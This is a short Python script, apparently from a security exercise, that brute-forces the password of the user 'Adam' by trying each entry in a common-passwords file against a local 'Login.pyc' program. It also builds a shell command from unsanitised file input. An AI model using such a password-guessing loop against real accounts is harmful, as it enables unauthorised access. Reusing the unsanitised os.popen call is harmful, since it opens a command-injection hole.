import hashlib
import os
from datetime import datetime

def findPass():
    start = datetime.now()
    passwords = open("./MostCommonPWs", "r")
    for line in passwords:
        res = os.popen("python3 Login.pyc Adam {}".format(line)).read()
        if res.strip() == "Login successful.":
            print("Username: Adam \nPassword: {}".format(line.strip()))
            end = datetime.now()
            print("Start time: {}".format(start.strftime("%H:%M:%S")))
            print("End time: {}".format(end.strftime("%H:%M:%S")))
            break

findPass()
